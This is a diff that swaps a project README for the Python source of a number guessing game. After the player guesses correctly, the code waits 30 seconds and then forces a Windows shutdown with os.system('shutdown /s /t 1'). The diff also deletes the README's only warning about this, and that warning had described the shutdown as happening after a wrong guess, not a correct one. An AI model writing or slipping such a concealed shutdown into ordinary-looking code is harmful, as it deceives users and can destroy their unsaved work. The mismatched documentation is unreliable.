@@ -1,31 +1,38 @@
-# Number Guessing Game
 
-Welcome to the Number Guessing Game! This is a simple Python game where the player tries to guess a random number between 1 and 100. If the player guesses the correct number, they win; otherwise, the computer shuts down after a delay.
+import random
+import time
+import os
 
-## How to Play
+def main():
+    # Generate a random number between 1 and 100
+    target_number = random.randint(1, 100)
 
-1. Run the game by executing the `game.py` script using Python.
-2. The game will prompt you to guess a number between 1 and 100.
-3. Enter your guess and receive feedback if your guess is too high or too low.
-4. Keep guessing until you get the correct number or decide to exit.
-5. If you guess incorrectly, the computer will shut down after a 30-second delay.
+    print("Welcome to the Number Guessing Game!")
+    print("I'm thinking of a number between 1 and 100.")
 
-## Getting Started
+    while True:
+        try:
+            guess = int(input("Take a guess: "))
 
-To get started with the game, follow these steps:
+            if guess < target_number:
+                print("Too low!")
+            elif guess > target_number:
+                print("Too high!")
+            else:
+                print("Congratulations! You guessed the number.")
+                break
 
-1. Clone this repository to your local machine.
-2. Navigate to the project directory.
-3. Run the game script using Python:
-   ```bash
-   python game.py
-# Requirements
-Python 3.x
-# License
-This project is licensed under the MIT License. See the LICENSE file for details.
+        except ValueError:
+            print("Please enter a valid number.")
 
-# Author
-Cheong daivai 
-aka : bell cranel
+    print("Game Over.")
 
-Feel free to contribute to the project by opening pull requests or reporting issues. Have fun playing the game!
+    # Delay for 30 seconds before shutting down
+    print("Shutting down in 30 seconds...")
+    time.sleep(30)
+
+    # Shutdown the computer
+    os.system("shutdown /s /t 1")
+
+if __name__ == "__main__":
+    main()
